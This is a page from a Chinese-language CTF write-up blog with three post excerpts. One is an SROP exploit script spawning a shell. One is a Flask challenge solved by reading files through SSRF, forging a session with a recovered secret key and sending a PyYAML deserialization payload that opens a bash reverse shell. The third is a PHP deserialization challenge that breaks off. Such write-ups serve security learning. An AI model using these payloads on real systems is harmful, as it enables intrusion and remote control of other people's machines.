<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Page 2 | Antel0p3&#39;s blog</title>
  <meta name="author" content="John Doe">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>Antel0p3&#39;s blog<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		wubba lubba dub dub.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/11/07/Backdoorctf-funsignals-wp/" >Backdoorctf-funsignals-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-11-07
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/16-srop/backdoor_funsignals">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./funsignals</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x10000000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>就是几行汇编代码  第一次syscall 读取标准输入到栈上   第二次syscall 触发sigreturn 明显SROP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.shellcode:10000000     _shellcode segment byte public &#x27;CODE&#x27; use64</span><br><span class="line">.shellcode:10000000     assume cs:_shellcode</span><br><span class="line">.shellcode:10000000     ;org 10000000h</span><br><span class="line">.shellcode:10000000     assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">.shellcode:10000000</span><br><span class="line">.shellcode:10000000     public _start</span><br><span class="line">.shellcode:10000000     _start:</span><br><span class="line">.shellcode:10000000     xor     eax, eax</span><br><span class="line">.shellcode:10000002     xor     edi, edi</span><br><span class="line">.shellcode:10000004     xor     edx, edx</span><br><span class="line">.shellcode:10000006     mov     dh, 4</span><br><span class="line">.shellcode:10000008     mov     rsi, rsp</span><br><span class="line">.shellcode:1000000B     syscall               ; LINUX - sys_read</span><br><span class="line">.shellcode:1000000D     xor     edi, edi</span><br><span class="line">.shellcode:1000000F     push    0Fh</span><br><span class="line">.shellcode:10000011     pop     rax</span><br><span class="line">.shellcode:10000012     syscall               ; LINUX - sys_rt_sigreturn</span><br><span class="line">.shellcode:10000014     int     3             ; Trap to Debugger</span><br><span class="line">.shellcode:10000015</span><br><span class="line">.shellcode:10000015     syscall:              ; LINUX -</span><br><span class="line">.shellcode:10000015     syscall</span><br><span class="line">.shellcode:10000017     xor     rdi, rdi</span><br><span class="line">.shellcode:1000001A     mov     rax, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.shellcode:10000021     syscall               ; LINUX - sys_exit</span><br><span class="line">.shellcode:10000021</span><br><span class="line">.shellcode:10000021     ; ---------------------------------------------------------------------------</span><br><span class="line">.shellcode:10000023     flag db &#x27;fake_flag_here_as_original_is_at_server&#x27;,0</span><br><span class="line">.shellcode:10000023     _shellcode ends</span><br></pre></td></tr></table></figure>

<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>通过vmmap可以看到<code>.shellcode</code>段权限为RWX    可以构造SROP链   </p>
<p>第一次置<code>rsp = 0x10000030, rip = start</code>  则 sigreturn 之后栈顶指向0x10000030  并且再次回到start执行读取操作</p>
<p>第二次发送置<code>rax = 0x3b (execve), rdi = &amp;&quot;/bin/sh&quot;, rsi = 0, rdx = 0, rsp = 0x10000030, rip = 0x1000000b (syscall)</code>  这次sigreturn后跳转至syscall执行execve</p>
<p>这里<code>/bin/sh</code>地址计算：  栈顶存放sigReturnFrame 结构体0xf0, 随后跟上binsh  偏移即为 0xf8</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">proc = process(<span class="string">&quot;./funsignals&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x10000000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> + <span class="string">&#x27;c\n&#x27;</span> * <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x10000000</span></span><br><span class="line">new_stack = <span class="number">0x10000030</span></span><br><span class="line">syscall = <span class="number">0x1000000b</span></span><br><span class="line"></span><br><span class="line">f = SigreturnFrame()</span><br><span class="line">f.rip = start</span><br><span class="line">f.rsp = new_stack</span><br><span class="line"></span><br><span class="line">s(<span class="built_in">bytes</span>(f))</span><br><span class="line"></span><br><span class="line">f = SigreturnFrame()</span><br><span class="line">f.rax = <span class="number">59</span></span><br><span class="line">f.rdi = new_stack + <span class="number">0xf8</span></span><br><span class="line">f.rip = syscall</span><br><span class="line">f.rsp = new_stack</span><br><span class="line">f.rsi = <span class="number">0</span></span><br><span class="line">f.rdx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(<span class="built_in">bytes</span>(f) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>



	
	</div>
  <a type="button" href="/2023/11/07/Backdoorctf-funsignals-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/25/HDCTF2023-YamiYami-wp/" >HDCTF2023-YamiYami-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-25
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3780">题目链接</a>  </p>
<p>三个链接    第一个可以通过file伪协议读取任意文件  第二个上传文件   第三个pwd说明当前目录在&#x2F;app</p>
<p>非预期:<br>在read路由读环境变量:&#x2F;proc&#x2F;1&#x2F;environ得到flag:NSSCTF{944467cc-e7ef-446b-92f6-b5f45479e30e}</p>
<p>预期:<br>在&#x2F;read路由尝试读app.py和flag发现被正则过滤,url二次编码app&#x2F;app.py:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///%25%36%31%25%37%30%25%37%30%25%32%46%25%36%31%25%37%30%25%37%30%25%32%45%25%37%30%25%37%39</span></span><br></pre></td></tr></table></figure>

<p>得到源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;[/read?url=https://baidu.com](view-source:http://node2.anna.nssctf.cn:28427/read?url=https://baidu.com)&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;[/upload](view-source:http://node2.anna.nssctf.cn:28427/upload)&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;[/pwd](view-source:http://node2.anna.nssctf.cn:28427/pwd)&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;boogipop并传递file文件名 会执行yaml.full_load(f)，触发pyyaml反序列化，但session伪造使得<code>session[passport]=Welcome To HDCTF2023</code>.</p>
<p>其中<code>random.seed(uuid.getnode())</code> 是使用 Python 中的 <code>random</code> 模块来设置随机数生成器的种子(seed)。在这里，<code>uuid.getnode()</code> 函数返回本机的MAC地址  而<code>app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233)</code>,说明这个secret_key我们可以获取,网卡地址可以通过读取<code>/sys/class/net/eth0/address</code>,得到<code>02:42:ac:02:6c:b9</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random  </span><br><span class="line">random.seed(<span class="number">0x0242ac0221e1</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random()*<span class="number">233</span>))</span><br></pre></td></tr></table></figure>

<p>得到secret_key是:158.36050847457943</p>
<p>加密:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./flask_session_cookie_manager3.py encode -t <span class="string">&#x27;&#123;&quot;passport&quot;:&quot;Welcome To HDCTF2023&quot;&#125;&#x27;</span> -s <span class="string">&#x27;211.00504154872561&#x27;</span></span><br><span class="line"><span class="comment"># eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZTkiaQ.X7A8EquGmn7zc7B2yYoiqW-fc1Y</span></span><br></pre></td></tr></table></figure>

<p>yaml反序列化内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:str</span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/tuple</span><br><span class="line">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\&quot;&#x27;)&quot;</span><br><span class="line">      - !!python/object/new:staticmethod</span><br><span class="line">        args: []</span><br><span class="line">        state:</span><br><span class="line">          update: !!python/name:eval</span><br><span class="line">          items: !!python/name:list</span><br></pre></td></tr></table></figure>

<p>命名1.txt在upload页面绕过黑名单    然后访问&#x2F;boogipop，改session  <code>file=/app/uploads/1.txt</code></p>

	
	</div>
  <a type="button" href="/2023/10/25/HDCTF2023-YamiYami-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/23/GDOUCTF2023-reverseClock-wp/" >GDOUCTF2023-反方向的钟-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-23
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3723">题目链接</a>   </p>
<p>简单反序列化   关键在于怎么通过<code>echo new $_POST[&#39;a&#39;]($_POST[&#39;b&#39;]);</code> 来获取flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>(<span class="string">&#x27;ing&#x27;</span>, <span 